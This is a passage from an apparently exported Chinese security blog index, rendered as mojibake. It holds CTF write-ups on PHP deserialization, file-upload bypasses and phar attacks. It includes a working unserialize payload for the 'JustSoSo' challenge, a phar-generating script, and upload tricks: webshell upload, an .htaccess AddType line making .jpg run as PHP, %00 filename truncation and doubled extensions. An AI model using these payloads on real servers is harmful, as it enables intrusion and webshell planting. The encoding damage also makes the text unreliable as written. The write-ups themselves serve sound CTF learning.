‡å¯¹è±¡ä¸æºå¯¹è±¡å…³è”ï¼Œåº”ä½¿ç”¨cloneå…³é”®å­—ã€‚ 123$ex1 = new Example('test1');// $ex1-&gt;nameç°åœ¨æ˜¯ï¼štest1$ex2 = clone $ex1;//$ex2-&gt;nameç°åœ¨æ˜¯ï¼štest1$ex2-&gt;name = 'test2';//ç°åœ¨$ex1-&gt;nameè¿˜æ˜¯test1,è€Œ$ex2-&gt;nameæ˜¯test2 è¿™é‡Œçœ‹åˆ°ï¼Œé€šè¿‡cloneä¹‹åï¼Œ$ex1ä¸$ex2æ˜¯ä¸¤ä¸ªä¸åŒçš„å¯¹è±¡ï¼Œä»–ä»¬æ‹¥æœ‰å„è‡ªçš„å˜é‡ç¯å¢ƒã€‚ä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œåœ¨è¿™ä¸¤ä¸ªå¯¹è±¡å†…éƒ¨ï¼Œæ‹¥æœ‰çš„æ˜¯å€¼ç±»å‹çš„æ•°æ®ï¼Œå¦‚æœæ˜¯å†…éƒ¨æ‹¥æœ‰çš„æ˜¯å¼•ç”¨ç±»å‹ï¼Œé‚£ä¹ˆé€šè¿‡cloneå¾—åˆ°çš„æ–°å¯¹è±¡ä¸­çš„å¼•ç”¨åˆ™ä»ç„¶æŒ‡å‘åŸå¼•ç”¨ å› æ­¤è¿™é‡Œå°±å¼•ç”³å‡º æµ…å¤åˆ¶ ä¸ æ·±å¤åˆ¶ çš„æ¦‚å¿µï¼š æµ…å¤åˆ¶ï¼š ä½¿ç”¨cloneæ¥å¤åˆ¶å¯¹è±¡ï¼Œè¿™ç§å¤åˆ¶å«åšâ€œæµ…å¤åˆ¶â€œï¼Œè¢«èµ‹å€¼å¯¹è±¡çš„æ‰€æœ‰å˜é‡éƒ½è¿˜æœ‰ä¸åŸæ¥å¯¹è±¡ç›¸åŒçš„å€¼ï¼Œè€Œæ‰€æœ‰çš„å¯¹å…¶ä»–å¯¹è±¡çš„å¼•ç”¨éƒ½ä»ç„¶æŒ‡å‘åŸæ¥çš„å¯¹è±¡ã€‚æ·±å¤åˆ¶ï¼šè¢«å¤åˆ¶çš„å¯¹è±¡çš„æ‰€æœ‰çš„å˜é‡éƒ½å«æœ‰ä¸åŸæ¥çš„å¯¹è±¡ç›¸åŒçš„å€¼ï¼Œé™¤å»é‚£äº›å¼•ç”¨å…¶ä»–å¯¹è±¡çš„å˜é‡ã€‚ è€Œå¦‚æœè¦è¿›è¡Œæ·±å¤åˆ¶ï¼Œåº”è¯¥åœ¨ç±»ä¸­å®šä¹‰ä¸€ä¸ª__clone()æ–¹æ³•,åœ¨è¿™ä¸ªæ–¹æ³•ä¸­å®Œæˆå¯¹ç›®æ ‡å¯¹è±¡çš„å±æ€§èµ‹ä»¥æ–°å€¼ï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šèµ˜è¿°ã€‚ æˆ–è€…åˆ©ç”¨ä¸²è¡ŒåŒ–(å†·è—ä¸è§£å†»)ï¼Œå³åºåˆ—åŒ–å†ååºåˆ—åŒ–ï¼š 12$tmp = serialize($ex1);$ex2 = unserialize($tmp); è¿™æ ·å¾—åˆ°çš„$ex2å°±æ˜¯ä¸€ä¸ªå…¨æ–°çš„å¯¹è±¡ æœ€åè¦å¼•å‡º&amp;ï¼Œå±äºæµ…æ‹·è´ï¼Œä¸¾ä¸ªä¾‹å­å°±èƒ½æ˜ç™½äº†ï¼š 12345&lt;?php$a = 'crispr';$b = &amp;$a;$b = 'crispr copy';echo $a; //æ­¤æ—¶$a = 'crispr copy' ç±»ä¼¼ä¼ åœ°å€è¿‡å»ï¼Œå…¶å®å®ƒä»¬çš„æ”¹å˜æ˜¯å®Œå…¨åŒæ­¥çš„ï¼Œæˆ–è€…è¯´å®ƒä»¬å°±æ˜¯ä¸€ä½“çš„ã€‚ å› æ­¤PHPç”Ÿæˆçš„POCå¦‚ä¸‹: 1234567891011121314&lt;?php class just4fun { var $enter; var $secret; function __construct() { $this-&gt;enter=&amp;$this-&gt;secret; //æµ…æ‹·è´ï¼Œå®ƒä»¬çš„å˜åŒ–å®Œå…¨åŒæ­¥ } } echo serialize(new just4fun()); ?&gt; é¢˜äºŒï¼š 2019å…¨å›½ä¿¡æ¯å®‰å…¨å¤§èµ› JustSoSo è¿™é‡Œæˆ‘æ˜¯æœ¬åœ°è¿›è¡Œå¤ç°çš„ï¼Œ23333ï¼Œåªèƒ½åˆ†æä¸€ä¸‹PHPäº†å’Œæ„é€ Pocï¼Œå…¶ä»–çš„æ–‡ä»¶åŒ…å«è¯»PHPå°±çœå»äº†ã€‚ã€‚ã€‚ hint.php 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php class Handle{ private $handle; public function __wakeup(){foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo \"Waking up\\n\"; }public function __construct($handle) { $this-&gt;handle = $handle; } public function __destruct(){$this-&gt;handle-&gt;getFlag();}}class Flag{ public $file; public $token; public $token_flag; function __construct($file){$this-&gt;file = $file;$this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); }public function getFlag(){$this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag){if(isset($this-&gt;file)){echo @highlight_file($this-&gt;file,true); } } }}?&gt; index.php 123456789101112131415161718192021222324252627282930&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET[\"file\"]; $payload = $_GET[\"payload\"];if(!isset($file)){echo 'Missing parameter'.'&lt;br&gt;';}if(preg_match(\"/flag/\",$file)){die('hack attacked!!!');}@include($file);if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(\"/flag/\",$value)) { die('stop hacking!'); exit(); } } $payload = unserialize($payload);}else{ echo \"Missing parameters\"; } ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt; é€šè¿‡GETè·å–ä¸¤ä¸ªå‚æ•°ï¼šfileå’Œpayloadã€‚Hint.phpä¸­æœ‰ä¸¤ä¸ªç±»Flagå’ŒHandleã€‚ä¸»è¦æ˜¯é€šè¿‡Handleæ¥è°ƒç”¨Flagçš„getFlag()å‡½æ•°ã€‚ä½†åœ¨Handleä¸­å­˜åœ¨wakeup()å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šé‡ç½®æ‰€æœ‰å˜é‡ï¼Œå¯¼è‡´ä¼ å…¥çš„Flagç±»å¯¹è±¡ä¸ºç©ºã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨å¢åŠ å¯¹è±¡ä¸ªæ•°çš„æ–¹å¼æ¥ç»•è¿‡wakeupå‡½æ•°ï¼Œå¢åŠ å¯¹è±¡ä¸ªæ•°æ—¶wakeupå‡½æ•°ä¾¿ä¼šå¤±æ•ˆï¼Œè¿™ä¸ªæ˜¯æ¯”è¾ƒå¸¸è§çš„ã€‚è¿˜è¦ç»•è¿‡ä¸€å±‚ï¼š 123456789101112 function __construct($file){$this-&gt;file = $file;$this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); }public function getFlag(){$this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag){if(isset($this-&gt;file)){echo @highlight_file($this-&gt;file,true); } è¿™é‡Œæˆ‘ä»¬çš„$fileæ˜¯flag.phpï¼Œè€Œåˆå§‹åŒ–åï¼Œ$this-&gt;token_flag = $this-&gt;tokenï¼Œæ¥ç€è°ƒç”¨getFlag()æ–¹æ³•åï¼Œé‡æ–°è®¾ç½®äº†$this-&gt;token_flagï¼Œå› æ­¤åœ¨è¿™é‡Œä¹Ÿåº”è¯¥æ˜¯è¦ä½¿ç”¨&amp;ç¬¦å·ï¼Œä»¤$this-&gt;token_flag = &amp;$this-&gt;tokenè¿›è¡Œæµ…æ‹·è´ã€‚ 1234567if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(\"/flag/\",$value)) { die('stop hacking!'); exit(); æ­¤æ—¶è¿˜éœ€è¦ç»•è¿‡?payload=ä¸èƒ½å‡ºç°flag,ä½†æ˜¯flagåœ¨flag.phpä¸­ï¼Œåœ¨urlå¤šåŠ æ–œæ å³å¯,///index.php?æ­¤æ—¶PHPä¾¿ä¸ä¼šè§£ææˆåŠŸäº†ã€‚æœ€ç»ˆPHPçš„Pocå¦‚ä¸‹: 123456789101112131415161718192021222324252627282930313233&lt;?phpclass Handle{ private $handle; public function __wakeup(){foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo \"Waking up\\n\"; }public function __construct($handle) { $this-&gt;handle = $handle; } public function __destruct(){ $this-&gt;handle-&gt;getFlag();}}class Flag{ public $file; public $token; public $token_flag; function __construct($file){$this-&gt;file = $file;$this-&gt;token_flag = &amp;$this-&gt;token;}} $o = new Flag('flag.php');$oo = new Handle($o);$ser = serialize($oo);print $ser;?&gt; æœ€ç»ˆpayload:///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}} æ³¨æ„Handleæœ‰ç§æœ‰å˜é‡ï¼Œåº”è¯¥åŠ ä¸Š%00","link":"/2020/03/18/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88PHP%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D/"},{"title":"æ–‡ä»¶ä¸Šä¼ ","text":"CTFhub æ–‡ä»¶ä¸Šä¼ ä¸€èˆ¬æ‰€çœ‹åˆ°çš„æ–‡ä»¶ä¸Šä¼ ï¼Œé™¤äº†è¿ğŸé‚£å°±æ˜¯é€šè¿‡htaccessæ¥æ›´æ”¹php.iniçš„é…ç½®ã€‚è€Œä¹Ÿå­˜åœ¨æ˜¯åˆ©ç”¨ä¸Šä¼ ç‚¹è¿›è¡Œphpååºåˆ—åŒ–æ¼æ´æˆ–æ˜¯å…¶ä»–çš„æ³¨å…¥ã€‚æœ¬æ–‡ä¸»è¦è¿›è¡ŒCTFhubä¸Šæ–‡ä»¶ä¸Šä¼ é¢˜çš„å¤ç°ã€‚å½“ç„¶å¯ä»¥ä¼ ä¸€äº›RCEä½†æ˜¯å°±åè€Œå¤æ‚äº†ï¼Œç›´æ¥ä¼ ğŸå°±å¯ä»¥æ›´ç®€å•ä¸€äº› ç¬¬ä¸€é¢˜æ— ä»»ä½•è¿‡æ»¤ã€‚ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶åŒ…å«ä¸€å¥è¯æœ¨ğŸ ç¬¬äºŒé¢˜å‰ç«¯è®¤è¯æŠ“åŒ…æ”¹åŒ…ä¼ å°±å¯ä»¥äº†ã€‚èšå‰‘è¿ä¸Š .htaccessæ–‡ä»¶ä¸Šä¼ è¿™ä¸ªæ˜¯æ¯”è¾ƒç‰¹åˆ«çš„ä¸€ç§è§£æé”™è¯¯ htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ é‚£ä¹ˆè¿˜æ˜¯å…ˆçœ‹é¢˜ç›®å§åŸºæœ¬è¿‡æ»¤äº†æ‰€æœ‰çš„æ–‡ä»¶ç±»å‹ï¼Œå”¯ç‹¬.htaccessæ²¡æœ‰ã€‚é‚£ä¹ˆä¸Šä¼ è¿™ä¸ªæ–‡ä»¶èƒ½å¤Ÿå¾—åˆ°ä»€ä¹ˆä»”ç»†çœ‹è¿‡ä¹‹åï¼Œå‘ç°jpgè¿˜æ˜¯å¯ä»¥ç”¨çš„ã€‚é‚£ä¹ˆè€ƒè™‘è¿˜æ˜¯ä¼ jpgå¹¶ä¸”ç”¨htaccessè®©æœåŠ¡å™¨è§£æjpgè½¬æ¢ä¸ºè§£æjpgçš„æ ¼å¼ 1payload:AddType application/x-httpd-php .jpg å‰©ä¸‹çš„å°±ä¼ ä¸€ä¸ªå¸¦ğŸçš„jpgå³å¯å¾—åˆ°äº†flag. MIMEéªŒè¯ MIME:å®¢æˆ·ç«¯è½¯ä»¶ï¼ŒåŒºåˆ†ä¸åŒç§ç±»çš„æ•°æ®ï¼Œä¾‹å¦‚webæµè§ˆå™¨å°±æ˜¯é€šè¿‡MIMEç±»å‹æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯GIFå›¾ç‰‡ï¼Œè¿˜æ˜¯å¯æ‰“å°çš„PostScriptæ–‡ä»¶ã€‚webæœåŠ¡å™¨ä½¿ç”¨MIMEæ¥è¯´æ˜å‘é€æ•°æ®çš„ç§ç±»ï¼Œ webå®¢æˆ·ç«¯ä½¿ç”¨MIMEæ¥è¯´æ˜å¸Œæœ›æ¥æ”¶åˆ°çš„æ•°æ®ç§ç±»ã€‚ä¹Ÿå°±æ˜¯æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹æ˜¯é€šè¿‡æ£€æŸ¥httpåŒ…çš„Content-Typeå­—æ®µä¸­çš„å€¼æ¥åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶æ˜¯å¦åˆæ³•çš„ã€‚é‚£å°±å¥½åŠäº†ï¼Œä¸ç®¡æˆ‘ä¸Šä¼ ä»€ä¹ˆç±»å‹çš„æ–‡ä»¶ï¼Œæˆ‘åªè¦ä¿®æ”¹Content-Typeå­—æ®µæ¥è®©æ£€æµ‹é€šè¿‡å°±è¡Œäº†ã€‚ä½œè€…ï¼šMaxx_FANé“¾æ¥ï¼šhttps://www.jianshu.com/p/01c1d5f05852æ¥æºï¼šç®€ä¹¦è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ é‚£å’Œç¬¬äºŒä¸ªå°±æ²¡å•¥åŒºåˆ«äº†ã€‚ã€‚ã€‚åªéœ€è¦æŠ“åŒ…æ”¹åŒ…ã€‚ä¸å¤šä»‹ç»äº† æ–‡ä»¶å¤´æ£€æŸ¥æ‰€è°“çš„æ–‡ä»¶å¤´æˆ‘åœ¨miscçš„ä»‹ç»ä¸­è®²è¿‡äº†ï¼Œä¹Ÿå°±æ˜¯16è¿›åˆ¶ä¸‹æ¯ä¸ªæ–‡ä»¶å›ºæœ‰çš„ä¸œè¥¿ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ç¼–è¾‘æ•´ä¸ªå›¾ç‰‡ï¼ŒæŠŠä¸€å¥æ¢æœ¨é©¬å¤¹åœ¨é‡Œé¢ã€‚è¿™æ ·æ£€éªŒæ–‡ä»¶å¤´ä¹Ÿå°±è‡ªç„¶æ²¡ç”¨äº†ã€‚æŠ“åŒ…æ”¹åç¼€ä»¥åŠå›¾ç‰‡æœ«å°¾ é‚£ä¹ˆå°±å¯ä»¥ä¸Šä¼ getshelläº†ã€‚ %00æˆªæ–­ç»•è¿‡è¿™ä¸ªæ˜¯ä¸€ä¸ªè€³ç†Ÿèƒ½è¯¦çš„æ–¹æ³•äº†ã€‚æˆ‘æƒ³å…ˆç»™å¤§å®¶ä»‹ç»ä¸‹åŸç†ï¼š 0x00æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸæ ‡è¯†ç¬¦ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰‹åŠ¨æ·»åŠ å­—ç¬¦ä¸²æ ‡è¯†ç¬¦çš„æ–¹å¼æ¥å°†åé¢çš„å†…å®¹è¿›è¡Œæˆªæ–­ï¼Œè€Œåé¢çš„å†…å®¹åˆå¯ä»¥å¸®åŠ©æˆ‘ä»¬ç»•è¿‡æ£€æµ‹ã€‚ ä¹ŸåŒæ ·æœ‰é™åˆ¶æ¡ä»¶ PHP&lt;5.3.29ï¼Œä¸”GPCå…³é—­GPCåŠŸèƒ½ä¹‹ä¸€å°±æ˜¯æ£€æŸ¥%00è¢«é”™è¯¯è®¤çŸ¥çš„æƒ…å†µã€‚æ‰€ä»¥éœ€è¦å…³é—­ã€‚ 1admin.php%00;a.jpg åŸæ¥æˆ‘ä¹Ÿæ˜¯å•çº¯çš„è®¤ä¸ºåœ¨æ–‡ä»¶åå¤„è¿›è¡Œæˆªæ–­ï¼Œå¦‚xx.php%00.jpgï¼Œè¿™æ ·å…¶å®æ˜¯ä¸å¯¹çš„ï¼Œæå–çš„æ—¶å€™ç¢°åˆ°%00å°±ä¼šè®¤ä¸ºå­—ç¬¦ä¸²æå–ç»“æŸäº†ï¼Œåé¢çš„.jpgå°±ä¸ä¼šå†æå–ï¼Œé‚£æ ·çš„æ•ˆæœè¿˜æ˜¯ç­‰äºä¸Šä¼ äº†.phpçš„æ–‡ä»¶ï¼Œæ— æ³•ç»•è¿‡ã€‚æ­£ç¡®çš„åšæ³•è¿˜æ˜¯æ•°æ®åŒ…ä¸­å¿…é¡»æœ‰ä¸Šä¼ æ–‡ä»¶çš„pathæ‰è¡Œã€‚ç»“åˆä¸Šä¼ è·¯å¾„+æ–‡ä»¶åï¼Œè¿›è¡Œæˆªæ–­ã€‚ ä½†æ˜¯è¿™é“é¢˜å¦‚æœç›´æ¥ä¼ çš„è¯ä¼šå˜æˆrandã€‚æ— æ³•æ‰¾åˆ°æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦å†æ¬¡æˆªæ–­ã€‚ç„¶ågetshellå°±å¯ä»¥äº† åŒå†™ç»•è¿‡é¢˜å¦‚å…¶åæ”¹æˆ.pphphpå°±è¡Œä¼ é©¬è¿ä¸Šå°±æˆäº†ã€‚å°±ç»“æŸäº†","link":"/2020/03/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"title":"ä»ååºåˆ—åŒ–ã€POPé“¾çœ‹PHPä»£ç å®¡è®¡","text":"å¾ˆé•¿æ—¶é—´ä¸ºphpååºåˆ—åŒ–å’Œpopé“¾çš„å„ç§é¢˜ç›®æ‰€å›°æƒ‘ï¼Œä¸€ç›´æƒ³ç³»ç»Ÿåœ°æ€»ç»“å’Œå·©å›ºä¸€ä¸‹ï¼Œäºæ˜¯å°±æœ‰äº†æœ¬æ–‡ã€‚æ–‡ç« ä»¥POPé“¾ã€ååºåˆ—åŒ–ä¸ºåˆ‡å…¥ç‚¹ï¼Œå¸Œæœ›è¯¦ç»†è®ºè¿°ä¸€äº›ä»£ç å®¡è®¡çš„æ–¹æ³•è®ºã€‚ å…ˆæ”¾ä¸Šå…¨æ–‡æ€è·¯å›¾ ä¸»è¦å†…å®¹åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š å‰ç½®çŸ¥è¯†è¡¥æ¼ æ¼æ´åˆ©ç”¨é“¾æ–¹æ³•è®º å®è·µå·¥å…·å’ŒæŠ€å·§ åŸºç¡€çŸ¥è¯†å‚è€ƒæ–‡ç«  æ¯”è¾ƒå…¨é¢ä¸”åŸºç¡€çš„æ–‡ç«  ä¸”è®²è§£äº†sessionçš„åºåˆ—åŒ–å™¨ä¸åŒå¼•å‘çš„æ¼æ´ ä»LCTF WEBç­¾åˆ°é¢˜çœ‹PHPååºåˆ—åŒ– phpååºåˆ—åŒ–popé“¾ä¸€åˆ™ æ¯”è¾ƒå›°éš¾çš„éƒ¨åˆ†æ˜¯å®é™…çš„CMSå®¡è®¡ Thinkphp 5.1.ååºåˆ—åŒ–æ¼æ´è¯¦è§£ å‰ç½®çŸ¥è¯†åºåˆ—åŒ–å’Œåºåˆ—åŒ–ä¸ºäº†ä¼ è¾“å¯¹è±¡ï¼Œæˆ‘ä»¬æŠŠç±»å˜æˆä¸€ä¸ªæœ‰ç»“æ„çš„å­—ç¬¦ä¸²ï¼Œå°±ç§°ä¸ºåºåˆ—åŒ–ã€‚æŠŠè¿™ä¸ªå­—ç¬¦ä¸²å˜ä¸ºåŸæ¥çš„å¯¹è±¡ï¼Œå°±ç§°ä¸ºååºåˆ—åŒ–ã€‚æˆ‘ä»¬åªèƒ½ä¿å­˜å¯¹è±¡çš„å±æ€§ï¼Œè€Œä¸èƒ½ä¿å­˜å¯¹è±¡çš„æ–¹æ³•ã€‚ ä¸ºäº†èƒ½å¤Ÿunserialize()ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡çš„ç±»å¿…é¡»å·²ç»å®šä¹‰è¿‡ï¼Œä¼ ç»Ÿç¼–ç¨‹éœ€è¦å¾ˆå¤šincludeå’Œrequireã€‚åæ¥å‡ºç°äº†autoloadingæŠ€æœ¯ï¼Œè‡ªåŠ¨å¯¼å…¥ä½¿ç”¨çš„ç±»ã€‚ è¦æä¸€ä¸‹Composer,è¿™æ˜¯ä¸€ä¸ªphpçš„åŒ…ç®¡ç†å·¥å…·,åŒæ—¶ä»–è¿˜èƒ½è‡ªåŠ¨å¯¼å…¥ä¾èµ–åº“ä¸­å®šä¹‰çš„ç±»ã€‚è¿™æ ·ä¸€æ¥ unserialize() å‡½æ•°ä¹Ÿå°±èƒ½ä½¿ç”¨æ‰€æœ‰ä¾èµ–åº“ä¸­çš„ç±»äº†,æ”»å‡»é¢å¢å¤§ä¸å°‘ã€‚ Composeré…ç½®çš„ä¾èµ–åº“å­˜å‚¨åœ¨vendorç›®å½•ä¸‹ å¦‚æœè¦ä½¿ç”¨Composerçš„è‡ªåŠ¨ç±»åŠ è½½æœºåˆ¶,åªéœ€è¦åœ¨phpæ–‡ä»¶çš„å¼€å¤´åŠ ä¸Šrequire DIR . '/vendor/autoload.php'; ååºåˆ—åŒ–çš„æ¼æ´ï¼šCVE-2016-7124 è§¦å‘è¯¥æ¼æ´çš„PHPç‰ˆæœ¬ä¸ºPHP5å°äº5.6.25æˆ–PHP7å°äº7.0.10ã€‚å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡__wakeup()çš„æ‰§è¡Œã€‚ é­”æœ¯æ–¹æ³•é­”æœ¯æ–¹æ³•æ˜¯åœ¨ä¸€å®šæƒ…å†µä¸‹ä¼šè¢«ç±»è‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³•ã€‚æˆ‘ä»¬ç»å¸¸é€šè¿‡æ§åˆ¶å±æ€§ï¼Œåˆ°è¾¾ä¸€äº›é­”æœ¯æ–¹æ³•ï¼Œè¿›è€Œä¸€æ­¥æ­¥åˆ°è¾¾æ¼æ´å‡½æ•°ã€‚ä¸‹é¢åˆ—å‡ºäº†æ–¹æ³•å’Œè¢«è°ƒç”¨çš„æ—¶æœº 1234567891011__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘__sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() //ç”¨äºä»ä¸å¯è®¿é—®(ä¸å­˜åœ¨)çš„å±æ€§è¯»å–æ•°æ®__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ Pharå‚è€ƒèµ„æ–™ï¼š pharè¯¦è§£+ç¨å¤æ‚åˆ©ç”¨å®ä¾‹ from seebug PHAR (â€œPhp ARchiveâ€) æ˜¯PHPé‡Œç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™ä½¿å¾—æ–‡ä»¶å‡½æ•°è¯»å–pharæ ¼å¼çš„æ–‡ä»¶æ—¶ï¼Œå°±ä¼šè§¦å‘unserializeã€‚è¿™æ ·å­æˆ‘ä»¬å°±ç›¸å½“äºåˆ©ç”¨å¥½å¤šæ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œè¾¾åˆ°äº†unserializeå‡½æ•°çš„ç›®çš„ã€‚ä¸‹é¢æ˜¯å—åˆ°å½±å“çš„æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œéå¸¸å¤šã€‚ ä½†pharä¹Ÿæœ‰åˆ©ç”¨çš„æ¡ä»¶ï¼š pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚ è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚ æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ ä¸‹é¢ç®€å•ä»‹ç»Pharæ ¼å¼çš„ç»“æ„ï¼š å››éƒ¨åˆ†ã€‚é¦–å…ˆæ˜¯æ ‡å¿—ä½ï¼šæ ¼å¼ä¸ºxxxï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();?&gt;æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚å‰é¢å†…å®¹ä¸é™ï¼Œå› æ­¤æˆ‘ä»¬ç»å¸¸å¯ä»¥æ–‡ä»¶å¤´ä¼ªé€ ã€‚ æ¥ä¸‹æ¥æ˜¯menifestï¼Œpharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚ å†æ¥ä¸‹æ˜¯è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼Œæ— å…³ç´§è¦ã€‚ æœ€åæ˜¯ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ã€‚ ç”Ÿæˆpharæ–‡ä»¶çš„è„šæœ¬ï¼š 123456789101112131415161718192021&lt;?php class MyObject { //ä½ çš„é€»è¾‘ } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stub /* $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER();?&gt;\"); è¿™æ ·ä¹Ÿå®Œå…¨æ²¡é—®é¢˜ */ $o = new MyObject(); $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ï¼Œæ³¨æ„ï¼ä¸æ·»åŠ ä¼šå¯¼è‡´æ— æ³•ç”Ÿæˆphar //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; è°ƒç”¨ä¹Ÿå¾ˆå®¹æ˜“ 12$filename = 'phar://phar.phar/a_random_string'; file_exists($filename);//æ–‡ä»¶å‡½æ•°å³å¯ å‘½åç©ºé—´åœ¨é€šå¸¸çš„PHPå¼€å‘ä¸­ï¼Œé™¤äº†ä½¿ç”¨è‡ªå·±çš„ä»£ç 